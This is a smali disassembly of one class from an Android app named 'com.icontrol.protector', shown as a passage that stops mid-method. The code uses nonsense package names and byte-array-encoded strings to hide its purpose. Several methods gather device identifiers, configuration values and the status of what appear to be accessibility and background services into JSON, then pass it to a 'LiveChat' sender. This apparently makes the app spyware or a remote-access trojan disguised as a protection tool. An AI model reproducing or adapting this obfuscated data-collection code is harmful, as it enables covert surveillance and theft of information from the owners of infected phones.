.class public Lcom/icontrol/protector/WorkServices$d;
.super Landroid/os/AsyncTask;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/WorkServices;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "d"
.end annotation


# static fields
.field private static volatile b:J

.field private static volatile c:J

.field private static d:Ljava/lang/String;

.field public static volatile e:J


# instance fields
.field a:Z


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/WorkServices$d;->d:Ljava/lang/String;

    const-wide/16 v0, 0x0

    sput-wide v0, Lcom/icontrol/protector/WorkServices$d;->e:J

    return-void

    :array_0
    .array-data 1
        0xat
        0x47t
        0x69t
        -0x55t
    .end array-data

    :array_1
    .array-data 1
        0x64t
        0x32t
        0x5t
        -0x39t
        0x32t
        0x12t
        0x31t
        0x6ft
    .end array-data
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/icontrol/protector/WorkServices$d;->a:Z

    return-void
.end method

.method public static a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4

    .line 1
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/va0;->k:Ljava/lang/String;

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p1, 0x3

    new-array p1, p1, [B

    fill-array-data p1, :array_4

    new-array v1, v2, [B

    fill-array-data v1, :array_5

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x74t
        0x43t
        -0x42t
        0x30t
    .end array-data

    :array_1
    .array-data 1
        -0x8t
        0x3at
        -0x32t
        0x55t
        0x3et
        -0x4ct
        -0x32t
        0x41t
    .end array-data

    :array_2
    .array-data 1
        0x32t
        0x44t
        -0x72t
        0x41t
        0x24t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x46t
        0x2dt
        -0x6t
        0x2dt
        0x41t
        0x57t
        -0x2dt
        -0x52t
    .end array-data

    :array_4
    .array-data 1
        0x3dt
        0x4dt
        0x34t
    .end array-data

    :array_5
    .array-data 1
        0x50t
        0x3et
        0x53t
        -0x23t
        -0x8t
        -0x25t
        -0x4bt
        -0x1et
    .end array-data
.end method

.method public static b(Landroid/content/Context;ILjava/lang/String;I)V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/WorkServices$d$d;

    invoke-direct {v1, p3, p0, p2, p1}, Lcom/icontrol/protector/WorkServices$d$d;-><init>(ILandroid/content/Context;Ljava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static c(Landroid/content/Context;)V
    .locals 8

    .line 1
    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->d:Ljava/lang/String;

    invoke-static {v0}, Lcom/icontrol/protector/n;->G(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0}, Lcom/icontrol/protector/n;->k(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const/4 v3, 0x4

    new-array v3, v3, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x3

    new-array v6, v5, [B

    fill-array-data v6, :array_2

    new-array v7, v4, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v3, v5, [B

    fill-array-data v3, :array_4

    new-array v6, v4, [B

    fill-array-data v6, :array_5

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v1, 0x2

    new-array v3, v1, [B

    fill-array-data v3, :array_6

    new-array v6, v4, [B

    fill-array-data v6, :array_7

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v5, [B

    fill-array-data v0, :array_8

    new-array v3, v4, [B

    fill-array-data v3, :array_9

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v3, Lcom/icontrol/protector/a;->d:Ljava/util/ArrayList;

    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v3

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    const/4 v0, 0x7

    new-array v3, v0, [B

    fill-array-data v3, :array_a

    new-array v6, v4, [B

    fill-array-data v6, :array_b

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-object v6, Lcom/icontrol/protector/b$b;->f:Lcom/icontrol/protector/b$b;

    invoke-static {v6}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v3, 0x5

    new-array v3, v3, [B

    fill-array-data v3, :array_c

    new-array v6, v4, [B

    fill-array-data v6, :array_d

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-object v6, Lcom/icontrol/protector/b$b;->h:Lcom/icontrol/protector/b$b;

    invoke-static {v6}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v3, 0x6

    new-array v6, v3, [B

    fill-array-data v6, :array_e

    new-array v7, v4, [B

    fill-array-data v7, :array_f

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    sget-object v7, Lcom/icontrol/protector/b$b;->e:Lcom/icontrol/protector/b$b;

    invoke-static {v7}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v0, [B

    fill-array-data v0, :array_10

    new-array v6, v4, [B

    fill-array-data v6, :array_11

    invoke-static {v0, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v6, Lcom/icontrol/protector/b$b;->i:Lcom/icontrol/protector/b$b;

    invoke-static {v6}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v0, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v3, [B

    fill-array-data v0, :array_12

    new-array v3, v4, [B

    fill-array-data v3, :array_13

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v3, Lcom/icontrol/protector/b$b;->g:Lcom/icontrol/protector/b$b;

    invoke-static {v3}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v5, [B

    fill-array-data v0, :array_14

    new-array v3, v4, [B

    fill-array-data v3, :array_15

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v3, Lcom/icontrol/protector/AccessServices;->r:Ljava/lang/String;

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v1, [B

    fill-array-data v0, :array_16

    new-array v3, v4, [B

    fill-array-data v3, :array_17

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v3, Lcom/icontrol/protector/WorkServices;->r:Ljava/lang/String;

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v1, [B

    fill-array-data v0, :array_18

    new-array v3, v4, [B

    fill-array-data v3, :array_19

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v3, Lcom/icontrol/protector/WorkServices;->s:Ljava/lang/String;

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v1, [B

    fill-array-data v0, :array_1a

    new-array v3, v4, [B

    fill-array-data v3, :array_1b

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0}, Lcom/icontrol/protector/n;->L(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v1, [B

    fill-array-data v0, :array_1c

    new-array v1, v4, [B

    fill-array-data v1, :array_1d

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0}, Lcom/icontrol/protector/n;->A(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v0, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/icontrol/protector/LiveChat;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void

    nop

    :array_0
    .array-data 1
        0x7ft
        -0xdt
        -0x4at
        -0x29t
    .end array-data

    :array_1
    .array-data 1
        0xbt
        -0x76t
        -0x3at
        -0x4et
        -0x9t
        -0xft
        -0x4t
        0x7ft
    .end array-data

    :array_2
    .array-data 1
        0x74t
        0x78t
        -0x7ct
    .end array-data

    :array_3
    .array-data 1
        0x4t
        0x16t
        -0x1dt
        0x37t
        -0x62t
        -0xet
        0x2ct
        -0x7ct
    .end array-data

    :array_4
    .array-data 1
        0x26t
        -0x66t
        -0x54t
    .end array-data

    :array_5
    .array-data 1
        0x55t
        -0x7t
        -0x22t
        -0x14t
        0x21t
        -0x2et
        -0x25t
        0x35t
    .end array-data

    :array_6
    .array-data 1
        0x22t
        0x7t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x4ft
        0x74t
        -0x14t
        0x3et
        0x2ct
        0x22t
        0x0t
        -0x19t
    .end array-data

    :array_8
    .array-data 1
        -0x62t
        0x5ft
        0x7dt
    .end array-data

    :array_9
    .array-data 1
        -0xct
        0x3ct
        0x9t
        0x35t
        0x7ct
        0x33t
        0x44t
        0x23t
    .end array-data

    :array_a
    .array-data 1
        0x57t
        -0x37t
        -0x70t
        -0x53t
        0x6ft
        -0x2bt
        -0x2et
    .end array-data

    :array_b
    .array-data 1
        0x3ct
        -0x54t
        -0x17t
        -0x3ft
        0x0t
        -0x4et
        -0x5ft
        -0x51t
    .end array-data

    :array_c
    .array-data 1
        -0x12t
        0x43t
        -0x2dt
        0xat
        -0x56t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x68t
        0x22t
        -0x5dt
        0x7at
        -0x27t
        0x43t
        -0x63t
        -0x46t
    .end array-data

    :array_e
    .array-data 1
        -0x1ft
        0x3ft
        -0x11t
        -0x50t
        0x29t
        0x65t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x80t
        0x5ct
        -0x65t
        -0x27t
        0x5ft
        0x1ft
        -0x21t
        0x10t
    .end array-data

    :array_10
    .array-data 1
        0x32t
        0x14t
        -0x7ft
        -0x6at
        0x3dt
        0x3dt
        -0x2t
    .end array-data

    :array_11
    .array-data 1
        0x5ct
        0x7bt
        -0xbt
        -0x1t
        0x5bt
        0x44t
        -0x73t
        -0x7at
    .end array-data

    :array_12
    .array-data 1
        0x67t
        -0x16t
        0x6dt
        -0x10t
        -0x1bt
        -0x34t
    .end array-data

    nop

    :array_13
    .array-data 1
        0x11t
        -0x5at
        0x4t
        -0x62t
        -0x72t
        -0x41t
        -0x16t
        -0x4ft
    .end array-data

    :array_14
    .array-data 1
        -0x2at
        0x37t
        0xbt
    .end array-data

    :array_15
    .array-data 1
        -0x49t
        0x54t
        0x7ft
        0x6dt
        -0x32t
        0x39t
        -0x1et
        0x34t
    .end array-data

    :array_16
    .array-data 1
        0x7t
        -0x7dt
    .end array-data

    nop

    :array_17
    .array-data 1
        0x46t
        -0x33t
        -0x72t
        -0x58t
        0x6et
        0xft
        0x2ct
        -0x4ct
    .end array-data

    :array_18
    .array-data 1
        0x1et
        0x12t
    .end array-data

    nop

    :array_19
    .array-data 1
        0x52t
        0x46t
        0x60t
        -0x32t
        -0x7bt
        -0x45t
        -0x3at
        0x7bt
    .end array-data

    :array_1a
    .array-data 1
        -0x7at
        0x34t
    .end array-data

    nop

    :array_1b
    .array-data 1
        -0x3ct
        0x77t
        0x51t
        -0x2dt
        0x5dt
        0xat
        -0x1dt
        0x3t
    .end array-data

    :array_1c
    .array-data 1
        -0xft
        -0x58t
    .end array-data

    nop

    :array_1d
    .array-data 1
        -0x4dt
        -0x8t
        -0x4bt
        0x70t
        0x42t
        -0x62t
        0x65t
        -0x30t
    .end array-data
.end method

.method public static d(Landroid/content/Context;I)V
    .locals 2

    .line 1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/icontrol/protector/WorkServices$d$a;

    invoke-direct {v1, p0, p1}, Lcom/icontrol/protector/WorkServices$d$a;-><init>(Landroid/content/Context;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public static e(Landroid/content/Context;I)V
    .locals 1

    .line 1
    new-instance p1, Ljava/lang/Thread;

    new-instance v0, Lcom/icontrol/protector/WorkServices$d$e;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/WorkServices$d$e;-><init>(Landroid/content/Context;)V

    invoke-direct {p1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p1}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method static synthetic f(J)J
    .locals 0

    .line 1
    sput-wide p0, Lcom/icontrol/protector/WorkServices$d;->b:J

    return-wide p0
.end method

.method static synthetic g(J)J
    .locals 0

    .line 1
    sput-wide p0, Lcom/icontrol/protector/WorkServices$d;->c:J

    return-wide p0
.end method

.method public static i()Z
    .locals 6

    .line 1
    sget-wide v0, Lcom/icontrol/protector/WorkServices$d;->e:J

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return v1

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sget-wide v4, Lcom/icontrol/protector/WorkServices$d;->e:J

    sub-long/2addr v2, v4

    const-wide/16 v4, 0x7530

    cmp-long v0, v2, v4

    if-gez v0, :cond_1

    const/4 v1, 0x1

    :cond_1
    return v1
.end method

.method public static j()Z
    .locals 6

    .line 1
    sget-wide v0, Lcom/icontrol/protector/WorkServices$d;->b:J

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return v1

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sget-wide v4, Lcom/icontrol/protector/WorkServices$d;->b:J

    sub-long/2addr v2, v4

    const-wide/16 v4, 0x7530

    cmp-long v0, v2, v4

    if-gez v0, :cond_1

    const/4 v1, 0x1

    :cond_1
    return v1
.end method

.method public static k()Z
    .locals 6

    .line 1
    sget-wide v0, Lcom/icontrol/protector/WorkServices$d;->c:J

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return v1

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sget-wide v4, Lcom/icontrol/protector/WorkServices$d;->c:J

    sub-long/2addr v2, v4

    const-wide/32 v4, 0xafc8

    cmp-long v0, v2, v4

    if-gez v0, :cond_1

    const/4 v1, 0x1

    :cond_1
    return v1
.end method

.method public static l(Landroid/content/Context;)V
    .locals 11

    .line 1
    :try_start_0
    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->w:Ljava/lang/String;

    const/4 v1, 0x0

    invoke-static {p0, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    const/4 v2, 0x4

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x3

    new-array v6, v5, [B

    fill-array-data v6, :array_2

    new-array v7, v4, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v3, 0xa

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v6, v4, [B

    fill-array-data v6, :array_5

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v6, 0x2

    new-array v7, v6, [B

    fill-array-data v7, :array_6

    new-array v8, v4, [B

    fill-array-data v8, :array_7

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    sget-object v8, Lcom/icontrol/protector/My_Configs;->Mob_Name:Ljava/lang/String;

    invoke-static {p0, v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v3, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v3, 0xf

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    new-array v7, v4, [B

    fill-array-data v7, :array_9

    invoke-static {v3, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {}, Lcom/icontrol/protector/n;->n()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v3, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v3, 0x5

    new-array v7, v3, [B

    fill-array-data v7, :array_a

    new-array v8, v4, [B

    fill-array-data v8, :array_b

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {p0}, Lntidisestablish/neumonoul/floccinaucinih/rd;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v7, 0xe

    new-array v7, v7, [B

    fill-array-data v7, :array_c

    new-array v8, v4, [B

    fill-array-data v8, :array_d

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {p0}, Lcom/icontrol/protector/n;->L(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v7, 0x12

    new-array v7, v7, [B

    fill-array-data v7, :array_e

    new-array v8, v4, [B

    fill-array-data v8, :array_f

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {p0}, Lcom/icontrol/protector/n;->A(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v7, 0x7

    new-array v8, v7, [B

    fill-array-data v8, :array_10

    new-array v9, v4, [B

    fill-array-data v9, :array_11

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-static {p0}, Lcom/icontrol/protector/n;->g(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v1, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/16 v8, 0xc

    new-array v8, v8, [B

    fill-array-data v8, :array_12

    new-array v9, v4, [B

    fill-array-data v9, :array_13

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-static {p0}, Lcom/icontrol/protector/n;->K(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v1, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v8, v4, [B

    fill-array-data v8, :array_14

    new-array v9, v4, [B

    fill-array-data v9, :array_15

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v6, v6, [B

    fill-array-data v6, :array_16

    new-array v9, v4, [B

    fill-array-data v9, :array_17

    invoke-static {v6, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    new-array v9, v4, [B

    fill-array-data v9, :array_18

    new-array v10, v4, [B

    fill-array-data v10, :array_19

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-static {p0, v6, v9}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v8, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v6, v7, [B

    fill-array-data v6, :array_1a

    new-array v8, v4, [B

    fill-array-data v8, :array_1b

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v8, 0x1

    const/16 v9, 0x1e

    invoke-static {p0, v9, v9, v8}, Lcom/icontrol/protector/n;->o(Landroid/content/Context;IIZ)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v6, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v6, v5, [B

    fill-array-data v6, :array_1c

    new-array v8, v4, [B

    fill-array-data v8, :array_1d

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-static {p0}, Lcom/icontrol/protector/n;->J(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v6, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v6, v7, [B

    fill-array-data v6, :array_1e

    new-array v8, v4, [B

    fill-array-data v8, :array_1f

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    sget-object v8, Lcom/icontrol/protector/b$b;->f:Lcom/icontrol/protector/b$b;

    invoke-static {v8}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v6, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v3, v3, [B

    fill-array-data v3, :array_20

    new-array v6, v4, [B

    fill-array-data v6, :array_21

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-object v6, Lcom/icontrol/protector/b$b;->h:Lcom/icontrol/protector/b$b;

    invoke-static {v6}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v3, 0x6

    new-array v6, v3, [B

    fill-array-data v6, :array_22

    new-array v8, v4, [B

    fill-array-data v8, :array_23

    invoke-static {v6, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    sget-object v8, Lcom/icontrol/protector/b$b;->e:Lcom/icontrol/protector/b$b;

    invoke-static {v8}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v6, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v6, v7, [B

    fill-array-data v6, :array_24

    new-array v7, v4, [B

    fill-array-data v7, :array_25

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    sget-object v7, Lcom/icontrol/protector/b$b;->i:Lcom/icontrol/protector/b$b;

    invoke-static {v7}, Lcom/icontrol/protector/b;->a(Lcom/icontrol/protector/b$b;)Ljava/lang/String;

    move-result-object v7

